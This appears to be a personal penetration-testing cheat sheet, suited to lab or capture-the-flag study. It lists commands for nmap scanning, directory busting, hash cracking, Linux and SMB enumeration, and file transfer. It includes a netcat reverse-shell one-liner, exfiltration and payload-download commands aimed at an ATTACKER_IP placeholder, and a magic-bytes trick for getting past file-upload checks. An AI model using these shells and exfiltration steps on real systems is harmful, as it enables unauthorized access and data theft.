# Security Notes

## Table of Contents

1. [Common Ports](#common-ports)
2. [Deserialization](#deserialization)
3. [Dir Busting](#dir-busting)
4. [File Upload](#file-upload)
5. [Fundamental Skills](#fundamental-skills)
6. [Generating a Wordlist](#generating-a-wordlist)
7. [Gobuster](#gobuster)
8. [Hashcat](#hashcat)
9. [Identifying Hashes](#identifying-hashes)
10. [John the Ripper](#john-the-ripper)
11. [Linux Enumeration](#linux-enumeration)
12. [Methodology Checklist](#methodology-checklist)
13. [Netcat](#netcat)
14. [nmap](#nmap)
15. [Post Exploitation](#post-exploitation)
16. [Reconnaissance](#reconnaissance)
17. [Reverse Shells](#reverse-shells)
18. [SMB Enumeration](#smb-enumeration)
19. [SMBClient](#smbclient)
20. [SMBMap](#smbmap)

## Common Ports

### What is a Port?

A port is simply a channel over which a computer can communicate.

### Common Ports

- **22 - SSH**: Remotely access a computer.
- **80 - HTTP**: Unprotected web traffic.
- **443 - HTTPS**: Encrypted web traffic.

## Deserialization

### PHP

### Java

### C#

### Useful Tools

- **phpggc**
- **ysoserial**

## Dir Busting

**Basic Syntax**

```bash
$ gobuster dir -u [URL] -w /path/to/wordlist
```

## File Upload

### Magic Bytes

**View magic bytes:**

```bash
head -c 20 /path/to/file | xxd
```

**Adding Magic Bytes to File**

```bash
head -c 8 /path/to/safe/file > unsafe_file
```

## Fundamental Skills

### Remote Access to a Computer

#### SSH

**Basic Syntax**

```bash
$ ssh [user@]IP_ADDRESS
```

#### SSH Keys

Generate a key pair:

```bash
$ ssh-keygen
```

To connect using a private key:

```bash
$ ssh -i /path/to/private/key [user@]IP_ADDRESS
```

### Filesharing Between Computers

#### Python Webserver

Start your server:

```bash
$ python3 -m http.server
```

#### Secure Copy

Copy a file to a server:

```bash
$ scp /path/to/local/file [user@][SOURCE_IP]:/path/to/target/destination
```

Copy a file from a remote host:

```bash
$ scp [user@][SOURCE_IP]:/path/to/target/file /path/to/local/file
```

#### Netcat

Setup a listener:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

Send a file:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

### Sending HTTP Requests

#### Using Curl

Send a GET request:

```bash
$ curl [URL]
```

Send a POST request:

```bash
$ curl -X POST [URL]
```

### Scripting & Programming

#### sh/bash

Create a bash script:

```bash
#!/bin/bash
echo '#!/bin/bash' > bash_script
chmod +x bash_script
bash bash_script
```

## Generating a Wordlist

### Using Hashcat

**Toggles**

```bash
hashcat --force --stdout passwords -r /usr/share/hashcat/rules/toggles1.rule > passwordlist
```

**Best64 Rules**

```bash
hashcat --force --stdout passwords -r /usr/share/hashcat/rules/best64.rule > passwordlist
```

### Trimming Wordlist

**Unique Passes**

```bash
cat passwordlist | sort -u > passwordlist-unique
```

**By Length**

```bash
cat passwordlist | awk 'length($0) > 7' > passwordlist-eight
```

## Gobuster

A tool for brute forcing webpages (aka directory busting), DNS names, and virtual hosts - written in [Go](https://golang.org/).

**Basic Syntax**

```bash
$ gobuster dir -u [URL] -w /path/to/wordlist
```

**VHOST Busting**

```bash
gobuster vhost -u example.com -w /path/to/wordlist
```

## Hashcat

**Basic Syntax**

```bash
hashcat -m 0 -a 0 -o cracked hashes /usr/share/wordlists/rockyou.txt
```

### Choosing Mode

```bash
$ hashcat --example-hashes
```

## Identifying Hashes

Run this command to find a list of potential hashing algorithms:

```bash
$ hashid [HASH]
```

## John the Ripper

**Basic Syntax**

```bash
john --format=FORMAT --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

## Linux Enumeration

### Check who you are

```bash
$ whoami
$ id
```

### Check for other people

```bash
$ cat /etc/passwd | grep sh
```

### Check kernel information

```bash
$ uname -a
```

### Find Command

Find files by user ownership:

```bash
$ find / -user userX
```

Find config files and redirect errors:

```bash
$ find / -name '*.conf' 2>/dev/null
```

Find suid files:

```bash
$ find . -perm /4000
```

### Linpeas

Install Linpeas from [GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

Run Linpeas:

```bash
$ ./linpeas.sh
```

### Standard Directories to Check

```
/home
/var/www
/var/backups
/var/logs
/opt
/usr/share
/usr/share/local
```

### List Processes & Services

List processes:

```bash
$ ps aux
$ netstat
$ ss -lntp
$ systemctl list-units --type=service --state=running
```

## Methodology Checklist

Most assessments involve the following things:
- enumeration
- exploitation
- persistence
- privilege escalation

### File Transfer

Setup a listener:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

Push a file:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

### Send a Reverse Shell

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

## nmap

A tool for discovering what services are running on each port for a given host.

**Basic Syntax**

Scan a target:

```bash
$ nmap a.b.c.d
```

General purpose command:

```bash
$ nmap -v -sC -sV -oA nmap/ a.b.c.d
```

Troubleshooting:

```bash
$ nmap -Pn a.b.c.d
$ nmap -v a.b.c.d
```

### Extra Information

Run default scripts:

```bash
$ nmap -sC a.b.c.d
```

Enumerate versions:

```bash
$ nmap -sV a.b.c.d
```

Enumerate OS:

```bash
$ sudo nmap -O a.b.c.d
```

### Specifying Ports

Scan a single port:

```bash
$ nmap -p X a.b.c.d
```

Scan a range of ports:

```bash
$ nmap -p X-Y a.b.c.d
```

Scan all ports:

```bash
$ nmap -p- a.b.c.d
```

### Scan UDP

```bash
$ sudo nmap -sU a.b.c.d
```

### Adjusting Speed

Increase speed:

```bash
$ nmap --min-rate 10000 a.b.c.d
```

Set a maximum rate:

```bash
$ nmap --max-rate 30 a.b.c.d
```

### Timing Templates

```bash
$ nmap -T paranoid|sneaky|polite|normal|aggressive|insane a.b.c.d
```

## Post Exploitation

### File Transfer

#### Exfiltration

SCP:

```bash
$ scp [user@][TARGET]:/path/to/target/file /local/path
```

Netcat:

```bash
$ nc -l -p [PORT] > /path/to/outfile
$ nc -w 3 [HOST_IP] [PORT] < /path/to/file
```

SMB

:

```bash
$ sudo impacket-smbserver share .
$ copy /path/to/file \\ATTACKER_IP\share\
```

### Upload Techniques

```bash
$ wget http://[ATTACKER_IP]/file -O /path/to/file
$ curl http://[ATTACKER_IP]/file -o /path/to/file
$ scp /path/to/target/file [user@][TARGET]:/target/path
```

## Reconnaissance

### Initial Network Enumeration

Scan a domain name:

```bash
$ host example.com
```

### Network Host Enumeration

Nmap host scan:

```bash
$ nmap -sP -PI a.b.c.0/24
```

ARP query:

```bash
$ arp -a -n
```

IP neighbors:

```bash
$ ip neigh
```

### nmap

Standard scan:

```bash
$ nmap -sC -sV -v -oA nmap/target [IP/HOST]
$ nmap -sC -sV -Pn -v -oA nmap/target [IP/HOST]
```

Full port scan:

```bash
$ nmap -p- -oA nmap/target-allports [IP/HOST]
```

OS enumeration:

```bash
$ sudo nmap -O -oA nmap/target-os [IP/HOST]
$ nmap --script smb-os-discovery [IP/HOST]
```

UDP scan:

```bash
$ sudo nmap -sU -oA nmap/target-udp [IP/HOST]
```

Vulnerability scan:

```bash
$ nmap --script vuln -oA nmap/target-vuln [IP/HOST]
```

### DNS Enumeration

Basic DNS lookup:

```bash
$ dig [IP/HOST]
$ dig axfr [IP/HOST]
```

## SMB Enumeration

### smbmap

Basic scan:

```bash
$ smbmap -H [HOST] -P [PORT]
```

Enumerate with null authentication:

```bash
$ smbmap -u null -p "" -H 10.10.10.40
```

Specific user:

```bash
$ smbmap -u username -H 10.10.10.40
```

### smbclient

Connect to a server:

```bash
$ smbclient //[IP]
```

Connect to a specific share:

```bash
$ smbclient //[IP]/[SHARE]
```

List shares:

```bash
$ smbclient -L hostname -U username
```

### Download a File

```bash
$ smbclient '//[IP]/[SHARE]' -c 'lcd [DOWNLOAD_PATH]; cd [DIRECTORY]; get [FILENAME]'
```

### Upload a File

```bash
$ smbclient '//[IP]/[SHARE]' -c 'cd [REMOTE_PATH]; lcd [LOCAL_DIRECTORY]; put [LOCAL_FILENAME]'
$ curl --upload-file /path/to/file -u [USERNAME] smb://[IP]/[SHARE]
```

## SMBMap

### Basic Syntax

```bash
smbmap -H [HOST] -P [PORT]
```


